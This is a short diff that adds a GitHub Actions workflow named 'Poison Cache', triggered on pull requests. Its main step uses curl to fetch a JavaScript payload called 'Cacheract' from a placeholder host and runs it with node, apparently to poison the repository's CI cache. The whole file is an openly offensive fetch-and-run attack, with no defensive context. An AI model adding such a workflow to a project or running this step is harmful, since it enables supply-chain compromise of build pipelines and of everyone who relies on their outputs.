@@ -1,0 +1,19 @@
+name: Poison Cache
+
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+
+jobs:
+  poison:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v4
+
+      - name: Download and run Cacheract
+        run: |
+          curl -sSfL https://your-payload-url.com/bundle.js > /tmp/cacheract.js
+          node /tmp/cacheract.js
